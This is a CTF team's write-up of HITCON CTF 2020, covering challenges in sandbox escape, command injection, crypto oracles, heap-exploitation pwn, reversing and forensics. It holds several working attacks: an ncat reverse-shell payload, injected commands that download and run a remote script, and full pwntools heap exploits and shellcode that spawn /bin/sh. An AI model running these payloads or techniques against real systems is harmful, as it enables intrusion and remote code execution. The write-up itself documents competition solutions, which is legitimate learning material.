# HITCON CTF 2020


**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20201128-hitconctf/) of this writeup.**


 - [HITCON CTF 2020](#hitcon-ctf-2020)
   - [Misc](#misc)
     - [oShell](#oshell)
     - [Baby Shark](#baby-shark)
     - [Baby Shark Revenge](#baby-shark-revenge)
       - [Solution 1](#solution-1)
       - [Solutoin 2](#solutoin-2)
   - [Crypto](#crypto)
     - [another secret note](#another-secret-note)
   - [Pwn](#pwn)
     - [Archangel Michael's Storage](#archangel-michaels-storage)
     - [Spark](#spark)
     - [Beats](#beats)
     - [dual](#dual)
     - [Revenge of Pwn](#revenge-of-pwn)
   - [Reverse](#reverse)
     - [Tenet](#tenet)
     - [SOP](#sop)
     - [11011001](#11011001)
   - [Forensics](#forensics)
     - [AC1750](#ac1750)


## Misc

### oShell

In this challenge we have a limited sandbox shell. Only a few commands can be run: `top`, `htop`, `ping`, `traceroute` .... Those commands use busybox binary. The functionality is pretty limited.

There is also a command `enable` requiring password to execute (Cisco switches have this command as well), so the first step is to leak the password.

@Billy found `htop` supports `strace` on a process. We can `strace` another sandbox shell process and run `enable`. `strace` will leak the password through `read()` system call.

After `enable`, we have a new command `tcpdump`. `tcpdump -w` can write [arbitrary files](https://insinuator.net/2019/07/how-to-break-out-of-restricted-shells-with-tcpdump/) with some limitation and `tcpdump -z` can run any system commands. However, we tried `tcpdump -z` but this version doesn't honor this feature:

```
compress_savefile failed. Functionality not implemented under your system
```

We need to find another way to RCE.

@kaibro found `top` can [be abused to RCE](https://gtfobins.github.io/gtfobins/top/#shell), if we can write arbitray contents to `.toprc`. Therefore the idea is to `tcpdump -w .toprc` and run `top` to get shell.

Unfortunately, with `tcpdump -w` we can only partial control the output packet. `top` requires the header of `.toprc` to be correct. Otherwise it will fail to launch.

We also note that `top` can also save the initla configuration (with the correct header) to `.toprc` by pressing `W` in `top`. Thus, our exploit idea is:

1. run `top` in shell A, and save a correct `.toprc` file
2. run `tcpdump -w` in shell B to write `.toprc`. Now the `.toprc` is corrupted
3. send 7 - 8 packets to move the `tcpdump -w` offest after the header
5. save a correct `.toprc` file in shell A again
6. send the payload packets so `tcpdump -w` write the command after the coorect header
7. restart `top` in shell A and press `Y, <enter>, <enter>` to get shell

To control the output of `tcpdump packets`, `ping` and `traceroute` can be used. We use the UDP packet respone in `traceroute`.


tcpdump to `.toprc`:

```
tcpdump -n -i eth0 -w /home/oShell/.toprc -U -A udp port 42345 -vvvv
```

The UDP response which contains our payload:

```
ncat -klu 42345 -v --sh-exec "echo -e '\npipe\tx\texec /bin/sh 1>&0 2>&0'"
```

The traceroute command. We need to specify the first hop number in `-f` and the UDP base port `-p`:

```
traceroute -i eth0 -p 42344 -f 12 240.240.240.240
```

Flag: `HITCON{A! AAAAAAAAAAAA! SHAR~K!!!}`

### Baby Shark


Command injection using `;`:

```sh
ls ; wget kaibro.tw
ls ; sh index.html
```

Flag: `hitcon{i_Am_s0_m155_s3e11sh0ck}`

### Baby Shark Revenge

#### Solution 1

by [@kaibro](https://twitter.com/kaikaibro)

Command injection using `()`. Bypass `.` limitation using decimal ip address.

Because `wget` in busybox cannot specifiy the name without `-o`, we use `ftpget` to download the file with a custom filename.

```sh
ls ()ftpget 921608994:10001 meow123 meow123
ls ()sh meow123
```

Flag: `hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}`

#### Solutoin 2

by bookgin

```
> ls ()python3
> ls
> find =chr(0x5f)+chr(0x5f)+ ...
> find
> id ,eval(find)
> id
```


## Crypto

### another secret note

In this challenge, this key will never change

```python
open('key','rb').read()
```

The service given two mainly function :

* register :
    
    * Encrypt `{'secret': 'hitcon{JSON_is_5', 'who': 'user', "name": @name}` with any name in ascii character

* login :

    1. Decrypt the token, and you can set the IV if you want. 
    (Note that if you set the IV, The default IV will change. We can use this feature to do something.)

    2. Make 'cmd' exists in decrypted token, you can execute given function.

        * get_secret 
        * get_time
        * note 
        * read_note
    
    3. Encrypted the data again.

We know that `json.loads` will format the json and merge the same key:

```python
json.loads('{"a":"z","b":"y"}')
# -> {'a': 'z', 'b': 'y'}
json.loads('{"":"a","":"b"}')
# -> {'': 'b'}
```

We can use these feature to pull the message out and make Encryption Oracle.

Exploit :

Fixed the IV, and pull bytes from bytes.

Get All pair in ascii range :

```python
0123456789ABCDEF
{"secret": "hitc` <- First block
{"": 12,  "t": "  <- Set IV to change first block
{"": 12, "t": "o  <- After Login
```

Find the match cipher to get the flag

```python
{"": 12,  "t": "a
{"": 12,  "t": "b
{"": 12,  "t": "C
...
{"": 12,  "t": "~
```

user_secret: `hitcon{JSON_is_5`

--------

Use `register` command brute force ascii range prefix, 

we can get `prefix + (iv ^ data ^ prefix_iv)` and do any encryption.

Find the pattern : 

```python
pattern = '****************et","":"*'+'*************","who":"admin","":"************","name":"admin","":"**********************","":"******"}\x01'
('*' can be any ascii)
```



and change IV to make the first block become `"cmd": "get_secr` and we can get the encrypted `admin_secret`.

Afthe here is same as `user_secret`, just pull the flag byte by byte and do encryption oracle to find the secret.

admin_secret: `0_woNderFul!@##}`

FLAG : `hitcon{JSON_is_50_woNderFul!@##}`

## Pwn

### Archangel Michael's Storage

* Vulnerability
    * OOB write negative index on Type 3 storage
* Exploit
    * Trick VS subsegment (`real_size`) into smaller `fake_size`, where `fake_size` < `real_size`, such that the whole VS subsegment will be freed after `fake_size` chunk is freed, this will lead to overlapped chunk as we only free `fake_size` chunk but `real_size` is freed
    * With pre-controlled layout and overlapped chunk, we can leak heap address
    * Leak `ntdll`, `kernel32`, `PEB`, `TEB`, stack address to ROP
    * https://github.com/how2hack/CTF-writeups/blob/master/2020/hitcon/MichaelStorage/exp.py
* Flag: `hitcon{S3gm3nt_H34p_1s_th3_h34ven_F34l_4_u}`

### Spark
- Crash to leak kernel heap and stack address.
- Overwrite Node struct using distance array by UAF.
- Use `msgsnd` `msgrcv` to change `index` of UAF node repeatly.
- Use `dis[edge->node->index]` to arbitrary write.
- Write value to userland and search offset.
- `modprobe_path`
https://github.com/yuawn/CTF/tree/master/2020/hitcon/spark

### Beats

```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '18.178.221.5'
port = 4869

binary = "./beats"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

if len(sys.argv) == 1:
  r = remote("127.0.0.1" ,4869)
  #r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

def rol(val, r_bits, size=64):
    return (val << r_bits%size) & (2**size-1) | \
           ((val & (2**size-1)) >> (size-(r_bits%size)))


if __name__ == '__main__':
  r.recvuntil(":")
  r.sendline("1")
  r.recvuntil(":")
  tls_dtor_list = 0x404110
  r.sendline(p32(0x19) + p32(0xb) + p64(0x4040a0) + "D"*0x48 + p32(0x19) + p32(2) + p32(0x19) + p32((0x224a8+8 + 0x80)/8) + p32(0x19) + p32((0x20f00)/8) + cyclic(0x21000) +   p64(0x426690) + cyclic(0x22458-0x21008) + p64(0x4040a0) + p64(0x4444444444)*6 + p64(tls_dtor_list) + p64(0x404000) +"\x00"*0x80 ) # calloc 0x21000 size chunk & heap overflow will overwrite tls_dtor_list & function pointer gruad(fs:0x30)
  r.recvuntil(":")
  r.sendline("2")
  r.recvuntil(":")
  puts_plt = 0x0401140
  read_n = 0x0401413
  setvbuf_got = 0x403fe0
  r.send("1".ljust(0x10,"A"))
  payload = p64(0) + p64(0x81) + p64(rol(puts_plt,0x11)) + p64(setvbuf_got) + p64(0x434110) + p64(0x404110+0x100) + p64(0x21)*0x10
  payload = payload.ljust(0x100,"A")
  payload += p64(0) + p64(0x81) + p64(rol(read_n,0x11)) +  p64(0x404100+0x200) + p64(0x434118) + p64(0x404110+0x200)+ p64(0x21)*0x10
  r.sendline(payload)
  r.recvuntil(":Timeout") # Waiting for timeout to trigger exit() & use tls_dtor_list to control flow
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x813d0
  print("libc = {}".format(hex(libc)))
  system = 0x4f550 + libc
  payload = p64(0) + p64(0x51) + p64(rol(system,0x11)) + p64(0x404328) + p64(0x434120) + "/bin/sh\x00"

  r.sendline(payload)

  r.interactive()
```

### dual

```python=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '13.231.226.137'
port = 9573

binary = "./dual"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def create_note(idd):
  r.recvuntil("op>\n")
  r.sendline("1")
  r.recvuntil("pred_id>\n")
  r.sendline(str(idd))

def connect_note(idd,idd2):
  r.recvuntil("op>\n")
  r.sendline("2")
  r.recvuntil("pred_id>\n")
  r.sendline(str(idd))
  r.recvuntil("succ_id>\n")
  r.sendline(str(idd2))

def disconnect_node(idd,idd2):
  r.recvuntil("op>\n")
  r.sendline("3")
  r.recvuntil("pred_id>\n")
  r.sendline(str(idd))
  r.recvuntil("succ_id>\n")
  r.sendline(str(idd2))

def write_text(index,text):
  r.recvuntil("op>\n")
  r.sendline("4")
  r.recvuntil("node_id>\n")
  r.sendline(str(index))
  r.recvuntil("text_len>\n")
  r.sendline(str(len(text)))
  r.recvuntil("text>\n")
  r.send(text)

def write_bin(index,binary):
  r.recvuntil("op>\n")
  r.sendline("5")
  r.recvuntil("node_id>\n")
  r.sendline(str(index))
  r.recvuntil("bin_len>\n")
  r.sendline(str(len(binary)))
  r.recvuntil("bin>\n")
  r.send(binary)

def read_text(index):
  r.recvuntil("op>\n")
  r.sendline("6")
  r.recvuntil("node_id>\n")
  r.sendline(str(index))

def wtf():
  r.recvuntil("op>\n")
  r.sendline("7")

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  create_note(0)
  create_note(0)
  wtf()
  write_bin(0,"")
  create_note(0)
  create_note(0)
  root = 0x0519188
  pool = 0x0519170
  buf = 0x519800
  fwrite_got = 0x519098
  write_text(0,p64(0x41) + p64(0x41) + p64(0x519800) + p64(0x519800) + p64(0x519800+0x100) + p64(0x200) + p64(0) + p64(0)) # fake structure
  write_text(0x41,b"\x00"*192 + p64(fwrite_got)) # heap overflow & 0x20 tcache fd changed to fwrite_got

  create_note(0)
  printf_plt = 0x404056
  write_text(5,p64(printf_plt)) # Change fwrite_got of tcache attack to printf_plt
  fmt = "%p."*0x10
  write_text(0,fmt) # fmt leak libc
  read_text("0")
  for i in range(14):
    r.recvuntil(".")
  libc = int(r.recvuntil(".")[:-1],16) - 0x270b3
  print("libc = {}".format(hex(libc)))
  system = libc + 0x55410
  write_text(5,p64(system)) # fwrite_got changed to system 
  fmt = "sh;"
  fmt = fmt.ljust(0x60)
  write_text(0,fmt)
  read_text("0")

  r.interactive()
```

### Revenge of Pwn

* shellcraft.stager('0\n\t.include "/home/deploy/flag"', 0x4000) 
* will fail on asm and print error message with the flag.

```C=
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h> 

int main(int argc, char *argv[])
{
    setvbuf(stdout,0,2,0);
    char buf[0x100];
    puts("stack address @ 0x0");
    read(0,buf,0x100);
    int sockfd = 0, n = 0;
    char recvBuff[1024];
    struct sockaddr_in serv_addr; 

        
    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("\n Error : Could not create socket \n");
        return 1;
    } 

    memset(&serv_addr, '0', sizeof(serv_addr)); 

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(31337); 

    if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0)
    {
        printf("\n inet_pton error occured\n");
        return 1;
    } 

    if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
       printf("\n Error : Connect Failed \n");
       return 1;
    } 
    dprintf(sockfd,"0\n\t.include \"/home/deploy/flag\"@");
    while(1) ;


}

```


## Reverse

### Tenet

shellcode will clear cookie when run
replayed shellcode will then restore cookie through case encoded bitstream

```python=
from pwn import *

context.arch = 'amd64'

shellcode = asm(f'''
                 jmp START

                 CASE0:
                   mov bl, BYTE PTR [rdi]
                   mov BYTE PTR [rdi], bl
                   or bl, al
                   shl al, cl
                   mov bl, BYTE PTR [rdi]
                   mov al, 0
                   jmp LANDING

                 CASE1:
                   mov bl, BYTE PTR [rdi]
                   mov BYTE PTR [rdi], bl
                   or bl, al
                   shl al, cl
                   mov bl, BYTE PTR [rdi]
                   mov al, 1
                   jmp LANDING

                 START:
                 mov rdi, 0x2170000
                 OUTERLOOP:
                   xor rcx, rcx
                   INNERLOOP:
                     xor rax, rax
                     mov al, byte ptr [rdi]
                     shr al, cl
                     and al, 1
                     test al, al
                     jz CASE0
                     jmp CASE1
                     LANDING:

                     mov r12, rcx
                     inc r12
                     mov rcx, r12
                     dec r12
                     mov r12, rcx

                     cmp rcx, 8
                     jne INNERLOOP
                   mov rcx, 8
                   mov BYTE PTR [rdi], 0

                   mov r12, rdi
                   inc r12
                   mov rdi, r12
                   dec r12
                   mov r12, rdi

                   cmp rdi, 0x2170008
                   jne OUTERLOOP

                 mov rdi, 0x2170008
                 mov rdi, 0
                 mov rax, 0x3c
                 syscall
                 ''')

r = remote('52.192.42.215',9427)

r.sendlineafter(')\n',str(len(shellcode)))
r.sendafter('..\n',shellcode)

r.interactive()
```

### SOP

```python=
from pwn import *
from Crypto.Util.number import long_to_bytes

def encrypt(inp):
    res = []
    for INP in inp:
        for i in range(32):
            INP[8] = (INP[8]+INP[9])&0xffffffff
            INP[11] = (INP[7]<<4)&0xffffffff
            INP[11] = (INP[11]+INP[2])&0xffffffff
            INP[12] = (INP[7]>>5)&0xffffffff
            INP[12] = (INP[12]+INP[3])&0xffffffff
            INP[11] = (INP[11]^INP[12])&0xffffffff
            INP[12] = (INP[7]+INP[8])&0xffffffff
            INP[11] = (INP[11]^INP[12])&0xffffffff
            INP[6] = (INP[6]+INP[11])&0xffffffff

            INP[11] = (INP[6]<<4)&0xffffffff
            INP[11] = (INP[11]+INP[4])&0xffffffff
            INP[12] = (INP[6]>>5)&0xffffffff
            INP[12] = (INP[12]+INP[5])&0xffffffff
            INP[11] = (INP[11]^INP[12])&0xffffffff
            INP[12] = (INP[6]+INP[8])&0xffffffff
            INP[11] = (INP[11]^INP[12])&0xffffffff
            INP[7] = (INP[7]+INP[11])&0xffffffff

        res.append(INP[6])
        res.append(INP[7])
    return res

def decrypt(inp):
    res = []
    for INP in inp:
        INP[8] = (INP[9]*32)&0xffffffff
        for i in range(32):
            INP[11] = (INP[7]<<4)&0xffffffff
            INP[11] = (INP[11]+INP[2])&0xffffffff
            INP[12] = (INP[7]>>5)&0xffffffff
            INP[12] = (INP[12]+INP[3])&0xffffffff
            INP[11] = (INP[11]^INP[12])&0xffffffff
            INP[12] = (INP[7]+INP[8])&0xffffffff
            INP[11] = (INP[11]^INP[12])&0xffffffff
            INP[6] = (INP[6]-INP[11]+(1<<32))&0xffffffff

            INP[11] = (INP[6]<<4)&0xffffffff
            INP[11] = (INP[11]+INP[4])&0xffffffff
            INP[12] = (INP[6]>>5)&0xffffffff
            INP[12] = (INP[12]+INP[5])&0xffffffff
            INP[11] = (INP[11]^INP[12])&0xffffffff
            INP[12] = (INP[6]+INP[8])&0xffffffff
            INP[11] = (INP[11]^INP[12])&0xffffffff
            INP[7] = (INP[7]-INP[11]+(1<<32))&0xffffffff
            INP[8] = (INP[8]-INP[9]+(1<<32))&0xffffffff

        res.append(INP[7])
        res.append(INP[6])
    return res

keys = [0x152ceed2,0xd6046dc3,0x4a9d3ffd,0xbb541082,0x632a4f78,0x0a9cb93d,0x58aae351,0x92012a14]

inp = [[0,0,0x2b0b575b,0x1e8b51cc,0x69a33fff,0x468932dc,keys[1],keys[0],0,0x51fdd41a,0,0,0,0],
       [0,0,0x688620f9,0x8df954f3,0x32e57ab6,0x7785df55,keys[3],keys[2],0,0x5c37a6db,0,0,0,0],
       [0,0,0x1bd1fc38,0x14220605,0xaca81571,0x2c19574f,keys[5],keys[4],0,0xb4f0b4fb,0,0,0,0],
       [0,0,0xe9ab109d,0x8d4f04b2,0x33f33fe0,0xf9de7e36,keys[7],keys[6],0,0xd3c45f8c,0,0,0,0]]
res = decrypt(inp)
print(b''.join(map(p32,res)))
```

### 11011001

```C++=
#include <bits/stdc++.h>
#include "z3++.h"
using namespace z3;

std::string s = R"foo(0------1----------0-
--1-1--1-----11--0-1
--------------------
---1-11-11---0------
--0-----1--0-----1-1
---0------1---1-----
1--00---1----11-0---
--1----1---0------0-
---------1--1--0---1
--00---1---0-0------
--------0----------0
-00------1-------0-0
----00--0----11-----
---------1-0----0---
-0------1--0--------
---1--0---0----0--11
-0----0-1---01------
----0----0------11--
-0----10-0-0--------
0------1-----0-00-0-
)foo";

context ctx;

expr get(int x, int y) {
  return ctx.bool_const((std::to_string(x) + "_" + std::to_string(y)).c_str());
}
constexpr int kN = 20;
char gc(int x, int y) {
  return s[x * (kN + 1) + y];
}

int main() {
  assert(s.size() == ((kN + 1) * kN));

  solver sol(ctx);
  for (int x = 0; x < kN; x++) {
    for (int y = 2; y < kN; y++) {
      sol.add(get(x, y - 2) || get(x, y - 1) || get(x, y));
      sol.add(!(get(x, y - 2) && get(x, y - 1) && get(x, y)));
    }
  }
  for (int y = 0; y < kN; y++) {
    for (int x = 2; x < kN; x++) {
      sol.add(get(x - 2, y) || get(x - 1, y) || get(x, y));
      sol.add(!(get(x - 2, y) && get(x - 1, y) && get(x, y)));
    }
  }

  for (int x = 0; x < kN; x++) {
    for (int y = 0; y < kN; y++) {
      char c = gc(x, y);
      if (c == '0')
        sol.add(!get(x, y));
      else if (c == '1')
        sol.add(get(x, y));
    }
  }

  int coef[kN];
  std::fill(coef, std::end(coef), 1);
  for (int x = 0; x < kN; x++) {
    expr_vector v(ctx);
    for (int y = 0; y < kN; y++)
      v.push_back(get(x, y));
    sol.add(pbeq(v, coef, 10));
  }
  for (int y = 0; y < kN; y++) {
    expr_vector v(ctx);
    for (int x = 0; x < kN; x++)
      v.push_back(get(x, y));
    sol.add(pbeq(v, coef, 10));
  }

  std::cout << sol.check() << std::endl;
  model m = sol.get_model();
  std::vector<int> res;
  for (int x = 0; x < kN; x++) {
    int num = 0;
    for (int y = 0; y < kN; y++) {
      int t = m.eval(get(x, y)).bool_value();
      if (t < 0) t = 0;
      std::cout << t;
      num = (num << 1) | t;
    }
    std::cout << std::endl;
    res.push_back(num);
  }
  for (int num : res)
    std::cout << num << std::endl;
}
```

## 	Forensics

### AC1750

The file we are given is the packet log of [this attack](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo). Just decrypt the UDP payloads according to the information from that article, and you'll see the commands that save the flag.
